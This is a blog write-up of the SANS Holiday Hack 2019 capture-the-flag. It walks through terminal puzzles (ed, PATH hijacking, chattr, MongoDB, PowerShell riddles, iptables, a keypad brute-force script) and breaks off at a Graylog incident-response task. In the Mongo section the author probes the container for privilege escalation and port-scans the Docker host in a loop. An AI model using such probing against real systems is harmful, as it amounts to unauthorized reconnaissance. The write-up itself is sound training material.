---
layout: post
title: SANS Holiday Hack - 2019
description: SANS Holiday Hack - 2019
categories: [ctf, sans]
tags: [ctf, sans]
---

Happy holidays everyone! Today's post is my write-up for this year's Holiday Hack. From what I can glean from the tweets of the CounterHack crew, this years challenge includes a variety of topics, from DFIR to machine learning. As always, it's sure to be exciting!


## Table of Contents
[Cranberry Pi Challenges](#cranberry-pi-challenges)
  1. [Ed Escape](#ed-escape)
  2. [Linux Path](#linux-path)
  3. [Nyanshell](#nyanshell)
  4. [Mongo](#mongo)
  5. [PowerShell Laser](#powershell-laser)
  6. [Keypad](#keypad)
  7. [Graylog](#graylog)
  8. [Holiday Hack Trail](#holiday-hack-trail)
  9. [JQ](#jq)

[CTF Challenges](#ctf-challenges)

  0. [Talk to Santa](#talk-to-santa)
  1. [Two Turtle Doves](#two-turtle-doves)
  2. [Unredact Threatening Document](#unredact-threatening-document)
  3. [Windows Log Analysis - Attack Outcome](#windows-log-analysis-attack-outcome)
  4. [Windows Log Analysis - Attacker Technique](#windows-log-analysis-attacker-technique)
  5. [Network Log Analysis - Determine Compromised System](#network-log-analysis-determine-compromised-system)
  6. [Splunk](#splunk)
  7. [Access Steam Tunnels](#access-steam-tunnels)
  8. [Bypass Frido Sleigh CAPTEHA](#bypass-frido-sleigh-capteha)
  9. [Retrieve Scraps of Paper from Server](#retrieve-Scraps-of-paper-from-server)
  10. [Recover Cleartext Document](#recover-cleartext-document)
  11. [Open Sleigh Shop Door](#open-sleigh-shop-door)
  12. [Filter Out Poisoned Sources of Weather Data](#filter-out-poisoned-sources-of-weather-data)

[Logo Challenge](#logo-challenge)
  1. [Lost in Translation](#lost-in-translation)
  2. [Tree UPC](#tree-upc)

[Summary](#summary)


## Cranberry Pi Challenges

Cranberry Pi challenges are a staple of the Holiday Hack. They are command-line puzzles, typically hosted on a Debian-based Docker container accessed via the web.
Successful completion of the challenges is done as a favor to one of Santa's elves, and the elves tend to reward you for your help with hints for the CTF challenges.


### Ed Escape
[Cranberry Pi Terminal](https://docker2019.kringlecon.com/?challenge=edescape)
>Hi, I'm Bushy Evergreen. Welcome to Elf U!
>I'm glad you're here. I'm the target of a terrible trick.
>Pepper Minstix is at it again, sticking me in a text editor.
>Pepper is forcing me to learn ed.
>Even the hint is ugly. Why can't I just use Gedit?
>Please help me just quit the grinchy thing.


Much like [last year](https://micrictor.github.io/SANS-Holiday-Hack/#essential-editor-skills), our first challenge is help Bushy exit a text editor. This year, the text editor is [ed](https://www.gnu.org/software/ed/ed.html). Ed, like vi, is a CLI text editor that comes preinstalled on most Linux systems, making at least a passing familiarity with it hugely valuable to anyone that regularly works with Unix-based systems.

As per the [ed manpage](http://man.cat-v.org/unix_7th/1/ed), there is no special key to press before issuing a command like there is in vi. Pressing 'q', then, will issue the quit command to ed, getting Bushy out of his predicament.

>Wow, that was much easier than I'd thought.
>Maybe I don't need a clunky GUI after all!
>Have you taken a look at the password spray attack artifacts?
>I'll bet that DeepBlueCLI tool is helpful.
>You can check it out on GitHub.
>It was written by that Eric Conrad.
>He lives in Maine - not too far from here!


Thanks to Bushy, we know that, at some point, we'll be hunting for artifacts of [password spraying](https://doubleoctopus.com/security-wiki/threats-and-tools/password-spraying/), and that [DeepBlueCLI](https://github.com/sans-blue-team/DeepBlueCLI) will help us do so. Perhaps more importantly, we learn that Eric Conrad is a Mainer.


Since we have a shell, I thought I'd poke around a bit. Using [find](http://man7.org/linux/man-pages/man1/find.1.html), I searched for any files with modification dates more recent than dpkg.log. Since the shell is in a docker container, this will return every file created or modified during the container build process. 

HH19-EdEnum-1

![HH19-EdEnum-1]({{ site.baseurl }}/images/HH19-EdEnum-1.png)


_/usr/local/bin/successfulescape_ seems interesting. Maybe we will be able to learn something about how the container interacts with the Holiday Hack scoring system. Using [grep](http://man7.org/linux/man-pages/man1/grep.1.html) to get the ASCII strings in the executable yielded the following interesting strings:

```
elf@9af7c304f9b9:~$ grep -o -a -P '[a-zA-Z0-9\:\/]{8,64}' /usr/local/bin/successfulescape
...
PyImport
PyObject
PyUnicode
urllib3
libpython3
```

It looks like this program was written in python then compiled using something like [py2exe](http://www.py2exe.org/). It uses urllib3, probably to issue a request to an API endpoint. Because the URL for the endpoint is encoded in UTF-16, I can't easily read it with grep, so I won't try to further analyze it. 

### Linux Path
[Cranberry Pi](https://docker2019.kringlecon.com/?challenge=path)
>Oh me oh my - I need some help!
>I need to review some files in my Linux terminal, but I can't get a file listing.
>I know the command is ls, but it's really acting up.
>Do you think you could help me out? As you work on this, think about these questions:
>
>    Do the words in green have special significance?
>
>    How can I find a file with a specific name?
>
>    What happens if there are multiple executables with the same name in my $PATH?


SugarPlum Mary seems to be having some issues with using the _ls_ command to view the contents of her directory. Due to the heavy hinting, it seems likely that she's fallen prey to a [path interception](https://attack.mitre.org/techniques/T1034/) attack. The following confirms this, then runs the legitimate _ls_ by specifying the full path.

![Linux Path]({{ site.baseurl }}/images/HH19-PATH.png)

In this listing, we can also see two hidden easter eggs.

.elfscream.txt

![ElfScream]({{ site.baseurl }}/images/HH19-ElfScream.png)


rejected-elfu-logos.txt

![ElfU-Logos]({{ site.baseurl }}/images/HH19-ElfU-Logos.png)


For assistance with listing files, SugarPlum tells us this:

>Oh there they are! Now I can delete them. Thanks!
>Have you tried the Sysmon and EQL challenge?
>If you aren't familiar with Sysmon, Carlos Perez has some great info about it.
>Haven't heard of the Event Query Language?
>Check out some of Ross Wolf's work on EQL or that blog post by Josh Wright in your badge.


Given this, it's fair to asume we'll be using [Sysmon](https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon) and [EQL](https://www.endgame.com/blog/technical-blog/introducing-event-query-language) during this year's challenges.


### Nyanshell
[Cranberry Pi](https://docker2019.kringlecon.com/?challenge=nyanshell)
>Welcome to the Speaker UNpreparedness Room!
>My name's Alabaster Snowball and I could use a hand.
>I'm trying to log into this terminal, but something's gone horribly wrong.
>Every time I try to log in, I get accosted with ... a hatted cat and a toaster pastry?
>I thought my shell was Bash, not flying feline.
>When I try to overwrite it with something else, I get permission errors.
>Have you heard any chatter about immutable files? And what is sudo -l telling me?


It seems Alabaster is getting trolled by someone. They replaced his logon shell with a program that just displays Nyancat.

First off, let's see what his logon shell is set to in /etc/passwd.
```
elf@9fa3892789dd:~$ cat /etc/passwd | grep alabaster
alabaster_snowball:x:1001:1001::/home/alabaster_snowball:/bin/nsh
```

Given the prompt, it seems fair to assume that something is wonky with the [file attributes](https://wiki.archlinux.org/index.php/File_permissions_and_attributes#File_attributes). To confirm this, I'll use the _lsattr_ command on the identified file.
```
elf@9ec691309356:~$ lsattr /bin/nsh
----i---------e---- /bin/nsh
```

The _i_ attribute means that the file is marked immutable. To solve this puzzle, we'll remove that attribute, copy _/bin/bash_ to _/bin/nsh_, and log in as Alabaster.
```
elf@9fa3892789dd:~$ sudo chattr -i /bin/nsh; cp /bin/bash /bin/nsh; su alabaster_snowball
Password: 
Loading, please wait......

You did it! Congratulations!
```

Talking with Alabaster after helping him undo the trick, he tells us the following:
>Who would do such a thing?? Well, it IS a good looking cat.
>Have you heard about the Frido Sleigh contest?
>There are some serious prizes up for grabs.
>The content is strictly for elves. Only elves can pass the CAPTEHA challenge required to enter.
>I heard there was a talk at KCII about using machine learning to defeat challenges like this.
>I don't think anything could ever beat an elf though!

Sounds like we'll be using machine learning, or more specifically computer vision, to bypass "CAPTEHA" checks.


### Mongo
[Cranberry Pi](https://docker2019.kringlecon.com/?challenge=mongo)
>Hey! It's me, Holly Evergreen! My teacher has been locked out of the quiz database and can't remember the right solution.
>Without access to the answer, none of our quizzes will get graded.
>Can we help get back in to find that solution?
>I tried lsof -i, but that tool doesn't seem to be installed.
>I think there's a tool like ps that'll help too. What are the flags I need?
>Either way, you'll need to know a teensy bit of Mongo once you're in.
>Pretty please find us the solution to the quiz!


Holly's teacher lost access to the Mongo database with the quiz answers, and needs our help getting the answers back. In short, we will have to find the IP and port for the MongoDB instance, connect to it, and get the answers to the quiz.

The method indicated in Holly's conversation will use [ps](http://man7.org/linux/man-pages/man1/ps.1.html) to view running processes, ideally including the IP:port in the command line. To do so, we will need to see the full command line, and specify wide output to avoid truncation.

```
elf@d2e78ead0f64:~$ ps -AFww
UID        PID  PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
elf          1     0  0  4656  3484  32 02:35 pts/0    00:00:00 /bin/bash
mongo        9     1  0 255957 67652 60 02:35 ?        00:00:03 /usr/bin/mongod --quiet --fork --port 12121 --bind_ip 127.0.0.1 --logpath=/tmp/mongo.log
elf        141     1  0  8600  2920   1 02:47 pts/0    00:00:00 ps -AFww
elf@d2e78ead0f64:~$ 
```

Now that we know that the server is running on localhost, port 12121, we can open a Mongo shell to it, and view the available databases.

```
elf@d2e78ead0f64:~$ mongo --shell 127.0.0.1:12121 --quiet
type "help" for help
> show dbs
admin   0.000GB
config  0.000GB
elfu    0.000GB
local   0.000GB
test    0.000GB
```

Given that we're trying to help an ElfU teacher, I selected the _elfu_ database and listed the available collections.

```
> use elfu
switched to db elfu
> db.getCollectionNames()
[
        "bait",
        "chum",
        "line",
        "metadata",
        "solution",
        "system.js",
        "tackle",
        "tincan"
]
```

Now I'll go ahead and list the documents in the _solutions_ collection, and follow the provided instructions.

```
> db.solution.find()
{ "_id" : "You did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **" }
>db.loadServerScripts();displaySolution();
         .
       __/ __
            /
       /.'*'. 
        .o.'.
       .'.'o'.
      *'.*.'.*.
     .'.*.'.'.o.
    .*.'.o.'.*.'.
       [_____]
        ___/


  Congratulations!!
```

For helping Holly earn some favor with her teacher, she tells us this:
>Woohoo! Fantabulous! I'll be the coolest elf in class.
>On a completely unrelated note, digital rights management can bring a hacking elf down.
>That ElfScrow one can really be a hassle.
>It's a good thing Ron Bowes is giving a talk on reverse engineering!
>That guy knows how to rip a thing apart. It's like he breathes opcodes!


Now that we've solved the challenge one way, I'm going to take a look around and see what I can learn. First, I'm going to see what permissions I have in the shell.

```
elf@72493d70f044:~$ sudo -l
User elf may run the following commands on 72493d70f044:
    (mongo) NOPASSWD: /usr/bin/mongod --quiet --fork --port 12121 --bind_ip 127.0.0.1 --logpath\=/tmp/mongo.log
    (root) SETENV: NOPASSWD: /usr/bin/python /updater.py
```

The second entry is interesting, particularly as _/updater.py_ doesn't exist. Unfortunately, only root has permissions to write to the filesystem root, so I can't exploit that directly. Another artifact of interest is _/go.sh_, which is likely the entrypoint to the container. I've included it below. 

```
#!/bin/bash

# Start mongo
sudo -u mongo /usr/bin/mongod --quiet --fork --port 12121 --bind_ip 127.0.0.1 --logpath=/tmp/mongo.log 2>&1 > /dev/null

exec /bin/bash
```

_go.sh_ is likely included in the container filesystem, and thus will not retain state. _/updater.py_, however, is likely mounted into the container at runtime. As such, if it was present, any changes to it would persist across the container lifespan, making it a juicy target for hackers.

Finally, I turned my attention to the network, specifically trying to connect to the host. By using mongo, I was able to confirm that the host is listening on port 22, SSH. This indicates that the host has sshd bound to 0.0.0.0, or all IP addresses, rather than specifying the specific IP that valid users will connect to. This creates a possibility of pivoting from a container to the host.

```
elf@e3e4391ca5b3:~$ ifconfig eth0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.24  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:18  txqueuelen 0  (Ethernet)
        RX packets 54  bytes 3688 (3.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 49  bytes 4475 (4.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

elf@e3e4391ca5b3:~$ mongo 172.17.0.1:22
MongoDB shell version v3.6.3
connecting to: mongodb://172.17.0.1:22/test
2019-12-17T04:09:58.772+0000 I NETWORK  [thread1] recv(): message len 759714643 is invalid. Min 16 Max: 48000000
2019-12-17T04:09:58.772+0000 E QUERY    [thread1] Error: network error while attempting to run command 'isMaster' on host '172.17.0.1:22'  :
connect@src/mongo/shell/mongo.js:251:13
@(connect):1:6
exception: connect failed
```

Using this, I put together a small bash script to do what is essentially a full SYN scan of the host.

```
elf@e3e4391ca5b3:~$ for PORT in {20..1000}; do mongo "172.17.0.1:$PORT" 2>&1 | grep isMaster; done
2019-12-17T04:18:57.385+0000 E QUERY    [thread1] Error: network error while attempting to run command 'isMaster' on host '172.17.0.1:22'  :
```

With nothing else interesting found, it's time to move on.


### PowerShell Laser
[Cranberry Pi](https://docker2019.kringlecon.com/?challenge=powershell)
>I'm Sparkle Redberry and Imma chargin' my laser!
>Problem is: the settings are off.
>Do you know any PowerShell?
>It'd be GREAT if you could hop in and recalibrate this thing.
>It spreads holiday cheer across the Earth ...
>... when it's working!

Looks like Sparkle is having some issues with his laser, and doesn't know how to use a PowerShell console to recalibrate it. Upon login, we get the following message:

```
🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲
🗲                                                                                🗲
🗲 Elf University Student Research Terminal - Christmas Cheer Laser Project       🗲
🗲 ------------------------------------------------------------------------------ 🗲
🗲 The research department at Elf University is currently working on a top-secret 🗲
🗲 Laser which shoots laser beams of Christmas cheer at a range of hundreds of    🗲
🗲 miles. The student research team was successfully able to tweak the laser to   🗲
🗲 JUST the right settings to achieve 5 Mega-Jollies per liter of laser output.   🗲
🗲 Unfortunately, someone broke into the research terminal, changed the laser     🗲
🗲 settings through the Web API and left a note behind at /home/callingcard.txt.  🗲
🗲 Read the calling card and follow the clues to find the correct laser Settings. 🗲
🗲 Apply these correct settings to the laser using it's Web API to achieve laser  🗲
🗲 output of 5 Mega-Jollies per liter.                                            🗲
🗲                                                                                🗲
🗲 Use (Invoke-WebRequest -Uri http://localhost:1225/).RawContent for more info.  🗲
🗲                                                                                🗲
🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲🗲 
```

Looks like our specific goal is to get the laser to output 5 MJ/liter. Issuing the supplied PowerShell command gives us an instruction manual for the laser's API.

```
----------------------------------------------------
Christmas Cheer Laser Project Web API
----------------------------------------------------
Turn the laser on/off:
GET http://localhost:1225/api/on
GET http://localhost:1225/api/off

Check the current Mega-Jollies of laser output
GET http://localhost:1225/api/output

Change the lense refraction value (1.0 - 2.0):
GET http://localhost:1225/api/refraction?val=1.0

Change laser temperature in degrees Celsius:
GET http://localhost:1225/api/temperature?val=-10

Change the mirror angle value (0 - 359):
GET http://localhost:1225/api/angle?val=45.1

Change gaseous elements mixture:
POST http://localhost:1225/api/gas
POST BODY EXAMPLE (gas mixture percentages):
O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10
----------------------------------------------------
```

We still have no idea what values need to be modified, and to what. Luckily for us, the hacker left behind a calling card at _/home/callingcard.txt_, which seems to indicate that the command history might help us.

```
PS /home/elf> Get-Content /home/callingcard.txt
What's become of your dear laser?
Fa la la la la, la la la la
Seems you can't now seem to raise her!
Fa la la la la, la la la la
Could commands hold riddles in hist'ry?
Fa la la la la, la la la la
Nay! You'll ever suffer myst'ry!
Fa la la la la, la la la la
```

As I don't, off hand, know the commandlet to query for the terminal history in PowerShell, I use _Get-Command_, or more precisely its alias _gcm_, to find all commands with a noun of _history_, then use the discovered command to view the history.

```
PS /home/elf> gcm -Noun history

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Add-History                                        6.2.3.0    Microsoft.…
Cmdlet          Clear-History                                      6.2.3.0    Microsoft.…
Cmdlet          Get-History                                        6.2.3.0    Microsoft.…
Cmdlet          Invoke-History                                     6.2.3.0    Microsoft.…

PS /home/elf> Get-History

  Id CommandLine
  -- -----------
   1 Get-Help -Name Get-Process 
   2 Get-Help -Name Get-* 
   3 Set-ExecutionPolicy Unrestricted 
   4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\services.htm 
   5 Get-Service | Export-CSV c:\service.csv 
   6 Get-Service | Select-Object Name, Status | Export-CSV c:\service.csv 
   7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent
   8 Get-EventLog -Log "Application" 
   9 I have many name=value variables that I share to applications system wide. At a com...
```

To un-truncate that last line, I pipe the results into Format-Table, again using its builtin alias _ft_, with the _-Wrap_ parameter.

```
9 I have many name=value variables that I share to applications system wide. At a
     command I will reveal my secrets once you Get my Child Items.
```

This seems to be pointing toward looking at the environment variables. Using tab-completion, I was able to skip the step of issuing _Get-ChildItem_ on _$env_, listing all environment variables and selecting the only non-standard one.

```
PS /home/elf> Write-Host $env:
env:_                                      env:PWD                                    
env:DOTNET_SYSTEM_GLOBALIZATION_INVARIANT  env:RESOURCE_ID                            
env:HOME                                   env:riddle                                 
env:HOSTNAME                               env:SHELL                                  
env:LANG                                   env:SHLVL                                  
env:LC_ALL                                 env:TERM                                   
env:LOGNAME                                env:USER                                   
env:MAIL                                   env:userdomain                             
env:PATH                                   env:username                               
env:PSModuleAnalysisCachePath              Env                                        
env:PSModulePath
PS /home/elf> Write-Host $env:riddle
Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all.
```

Given this, I issued, with the help of _Get-Command_ to find the cmdlet _Sort-Object_, the following command:

```
PS /home/elf> Get-ChildItem /etc -Recurse -File | Sort-Object -Property LastWriteTime
...
Directory: /etc/apt

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          12/21/19  3:01 PM        5662902 archive
```

After using _Expand-Archive_ on the discovered file, we get two files, _runme.elf_ and _riddle_. As I am clearly supposed to run the former, I try to do so.
```
PS /home/elf/archive/refraction> ./runme.elf                                                                                                                                        
Program 'runme.elf' failed to run: No such file or directoryAt line:1 char:1                                                       ...
```

Hmm, for some reason I can't run the file. My best guess is it's a permissions issue, so I use _chmod_ to add the execute permission.
```
PS /home/elf/archive/refraction> /bin/chmod +x ./runme.elf
PS /home/elf/archive/refraction> ./runme.elf
refraction?val=1.867
```

Perfect, one parameter down. We also get another riddle:

```
PS /home/elf/> Get-Content ./archive/refraction/riddle
Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity:

25520151A320B5B0D21561F92C8F6224
```

In a manner very similar to threat hunting given a file hash as an indicator of compromise (IOC), we now must find the file with a specific hash. To do this, I will pipe the name of every file into _Get-FileHash_, then use _Select-Object_ to find the right file.

```
PS /home/elf> Get-ChildItem -File -Recurse | Get-FileHash -Algorithm MD5 | Where-Object -Property Hash -like '25520151A320B5B0D21561F92C8F6224'

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             25520151A320B5B0D21561F92C8F6224                                       /home/elf/depths/produce/thhy5hll.txt
PS /home/elf> Get-Content /home/elf/depths/produce/thhy5hll.txt
temperature?val=-33.5

I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.
```

Given the text, I am probably looking for files that are the same size as this file, plus or minus 20%. Note that in this command, I specify a script block using _{ }_, and reference the piped value using the _$\__ variable.
```
PS /home/elf> Get-ChildItem -File -Recurse | Where-Object { ($_.Length -gt 200) -and ($_.Length -lt 250) } | Get-Content
Get process information to include Username identification. Stop Process to show me you're skilled and in this order they must be killed:

bushy
alabaster
minty
holly

Do this for me and then you /shall/see .
temperature?val=-33.5

I am one of many thousand similar txt's contained within the deepest of /home/elf/depths. Finding me will give you the most strength but doing so will require Piping all the FullName's to Sort Length.
```

This level wants me to kill the processes owned by these four accounts in the specified order. Easy enough, using our established ability to filter and pipe. To speed up the process, I'll also store the target usernames in an array and simply iterate over them.

```
PS /home/elf> 'bushy','alabaster','minty','holly' | ForEach-Object { Get-Process -IncludeUserName | Where-Object -Property UserName -like $_ | Stop-Process }
PS /home/elf> Get-Content /shall/see
Get the .xml children of /etc - an event log to be found. Group all .Id's and the last thing will be in the Properties of the lonely unique event Id.
```

In yet another layer to the challenge, now we must get all XML files in _/etc_, find the Windows Event Logs, and find the abnormal eventID. To find the abnormal one, using a technique SANS refers to as long-tail analysis, we will group the events on ID with the _Group-Object_.

```
PS /home/elf> Get-ChildItem -File -Recurse -Include '*.xml' /etc                

    Directory: /etc/systemd/system/timers.target.wants

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
--r---          11/18/19  7:53 PM       10006962 EventLog.xml
PS /home/elf> Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml | Group-Object -Property Id     

Count Name                      Group
----- ----                      -----
    1 1                         {System.Diagnostics.Eventing.Reader.EventLogRecord}
   39 2                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLog…
  179 3                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLog…
    2 4                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord}
  905 5                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLog…
   98 6                         {System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLogRecord, System.Diagnostics.Eventing.Reader.EventLog…

PS /home/elf> Import-Clixml /etc/systemd/system/timers.target.wants/EventLog.xml | Where-Object -Property Id -eq 1
...
CommandLine: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "`$correct_gases_postbody = @{`nO=6`nH=7`nHe=3`nN=4`nNe=22`nAr=11`nXe=10`nF=20`nKr=8`nRn=9`n}`n"
```


Now, let's try applying our discovered gas mixture, refraction, mirror angle, and temperature and see if we have everything we need.

```
PS /home/elf> Invoke-RestMethod -Uri http://localhost:1225/api/angle?val=65.5                                                      
Updated Mirror Angle - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf> Invoke-RestMethod -Uri http://localhost:1225/api/refraction?val=1.867
Updated Lense Refraction Level - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf> Invoke-RestMethod -Uri http://localhost:1225/api/temperature?val=-33.5
Updated Laser Temperature - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf> Invoke-RestMethod -Uri http://localhost:1225/api/gas -Method POST -Body "O=6&H=7&He=3&N=4&Ne=22&Ar=11&Xe=10&F=20&Kr=8&Rn=9"          
Updated Gas Measurements - Check /api/output if 5 Mega-Jollies per liter reached.
PS /home/elf> Invoke-RestMethod -Uri http://localhost:1225/api/output        
Success! - 5.28 Mega-Jollies of Laser Output Reached!
```

This challenge was not as easy as I initially expected. With multiple levels and lots of information to keep track of, I'm half expecting Sparkle to give me the gift of a free SANS course himself.

For our help, Sparkle tells us this:
>You got it - three cheers for cheer!
>For objective 5, have you taken a look at our Zeek logs?
>Something's gone wrong. But I hear someone named Rita can help us.
>Can you and she figure out what happened?


From what Sparkle said, it's fair to assume that objective 5 will include some form of network threat hunting. [RITA](https://www.activecountermeasures.com/free-tools/rita/) is a tool that performs statistical analysis on Bro/Zeek logs to identify beaconing and data exfiltration, amongst other things. 


### IPTables
[Cranberry Pi](https://docker2019.kringlecon.com/?challenge=iptables)
>OK, this is starting to freak me out!
>Oh sorry, I'm Kent Tinseltooth. My Smart Braces are acting up.
>Do... Do you ever get the feeling you can hear things? Like, voices?
>I know, I sound crazy, but ever since I got these... Oh!
>Do you think you could take a look at my Smart Braces terminal?
>I'll bet you can keep other students out of my head, so to speak.
>It might just take a bit of Iptables work.

Kent, a new elf, seems to have had his smart braces hacked. He's given us access to the CLI for his braces, with hopes that we will help him configure [iptables](https://linux.die.net/man/8/iptables) to keep pesky hackers out. Upon logging in, he tells us the following:
>I suspect someone may have hacked into my IOT teeth braces.
>I must have forgotten to configure the firewall...
>Please review /home/elfuuser/IOTteethBraces.md and help me configure the firewall.
>Please hurry; having this ribbon cable on my teeth is uncomfortable.

The file identified contains some instructions on how to use iptables, as well as the following requirements:
```
A proper configuration for the Smart Braces should be exactly:

1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains.
2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains.
3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22).
4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80.
5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80.
6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface.
```

First off, let's set the default policy to DROP for the indicated chains.
```
elfuuser@82f4a7a83b2c:~$ sudo iptables -P INPUT DROP
elfuuser@82f4a7a83b2c:~$ sudo iptables -P FORWARD DROP
elfuuser@82f4a7a83b2c:~$ sudo iptables -P OUTPUT DROP
```

With that out of the way, we use the _conntrack_ module to make iptables operate similarly to a stateful firewall.
```
elfuuser@82f4a7a83b2c:~$ sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
elfuuser@82f4a7a83b2c:~$ sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
```

Next, we specify that only one IP is allowed to access SSH, and that any IP can access FTP and HTTP.
```
elfuuser@82f4a7a83b2c:~$ sudo iptables -A INPUT -p tcp --dport 22 -s 172.19.0.225 -j ACCEPT 
elfuuser@82f4a7a83b2c:~$ sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT
elfuuser@82f4a7a83b2c:~$ sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
```
Following this, we will allow the smart braces to make outbound HTTP requests.
```
elfuuser@82f4a7a83b2c:~$ sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
```
Finally, we create a rule to allow anything coming from the loopback interface to connect.
```
elfuuser@82f4a7a83b2c:~$ sudo iptables -A INPUT -i lo -j ACCEPT
```

As thanks for giving the hacker in his head the boot, Kent tells us:
>Oh thank you! It's so nice to be back in my own head again. Er, alone.
>By the way, have you tried to get into the crate in the Student Union? It has an interesting set of locks.
>There are funny rhymes, references to perspective, and odd mentions of eggs!
>And if you think the stuff in your browser looks strange, you should see the page source...
>Special tools? No, I don't think you'll need any extra tooling for those locks.
>BUT - I'm pretty sure you'll need to use Chrome's developer tools for that one.
>Or sorry, you're a Firefox fan?
>Yeah, Safari's fine too - I just have an ineffible hunger for a physical Esc key.
>Edge? That's cool. Hm? No no, I was thinking of an unrelated thing.
>Curl fan? Right on! Just remember: the Windows one doesn't like double quotes.
>Old school, huh? Oh sure - I've got what you need right here...
>And I hear the Holiday Hack Trail game will give hints on the last screen if you complete it on Hard.

Ever the helpful elf, Kent lets us know that we should be able to bypass the locks on the nearby crate using nothing but browser developer tools. He also references a "Holiday Hack Trail Game," which, as of now, I have not heard of. 


### Keypad
[Keypad URL](https://keypad.elfu.org/?challenge=keypad)
>Hey kid, it's me, Tangle Coalbox.
>I'm sleuthing again, and I could use your help.
>Ya see, this here number lock's been popped by someone.
>I think I know who, but it'd sure be great if you could open this up for me.
>I've got a few clues for you.
>    One digit is repeated once.
>    The code is a prime number.
>    You can probably tell by looking at the keypad which buttons are used.

Tangle needs help recovering the code for this lock. 

It is immediately clear that the '1','3', and '7' keys are the most worn keys, and therefore probably make up the correct code. As we are told one digit repeats once, we now know that the code is no more than four characters. Using the following python script to apply both the first and second constraint to the identified keyspace, I was able to identify a list of five possible keypads. As a side note, the keyspace is 3 to the 4th power, or 81, making this a fairly computationally simple task.

```
keys = [1,3,7]

def isPrime(num):
    for x in range(2,num//2):
        if(num % x == 0):
            return False
    return True

def hasRepeat(numList):
    for x in keys:
        if(numList.count(x) == 2):
            return True
    return False

for a in keys:
    for b in keys:
        for c in keys:
            for d in keys:
                if(not hasRepeat([a,b,c,d])):
                    continue
                testNum = (a*1000) + (b*100) + (c*10) + d
                if(isPrime(testNum)):
                    print(testNum)
                    break
...
1373
1733
3137
3371
7331
```

Because I'm _1337_, I started at the bottom of the list, where the first code was correct. As thanks, Tangle tells us this:
>Yep, that's it. Thanks for the assist, gumshoe.
>Hey, if you think you can help with another problem, Prof. Banas could use a hand too.
>Head west to the other side of the quad into Hermey Hall and find him in the Laboratory.

I don't know what it means that he called me a gumshoe, but I can't imagine it was meant kindly.


### Graylog
[Graylog UI](https://incident.elfu.org/?challenge=graylog)
>It's me - Pepper Minstix.
>Normally I'm jollier, but this Graylog has me a bit mystified.
>Have you used Graylog before? It is a log management system based on Elasticsearch, MongoDB, and Scala.
>Some Elf U computers were hacked, and I've been tasked with performing incident response.
>Can you help me fill out the incident response report using our instance of Graylog?
>It's probably helpful if you know a few things about Graylog.
>Event IDs and Sysmon are important too. Have you spent time with those?
>Don't worry - I'm sure you can figure this all out for me!
>Click on the All messages Link to access the Graylog search interface!
>Make sure you are searching in all messages!
>The Elf U Graylog server has an integrated incident response reporting system. Just mouse-over the box in the lower-right corner.
>Login with the username elfustudent and password elfustudent.

Pepper is recruiting us for help with finishing up the paperwork for an incident response. We'll be using [GrayLog](https://graylog.org) to find the information required. 

Upon opening the interface, we can access a list of seven questions to answer. I will step through them in order.

>Minty CandyCane reported some weird activity on his computer after he clicked on a link in Firefox for a cookie recipe and downloaded a file.
>What is the full-path + filename of the first malicious file downloaded by Minty?

To start off with, I perform a wildcard query on the logs, making sure to select all time, so that I can get a feel for what fields are available for querying. I've pasted the list of fields below:
```
AccountDomain
AccountName
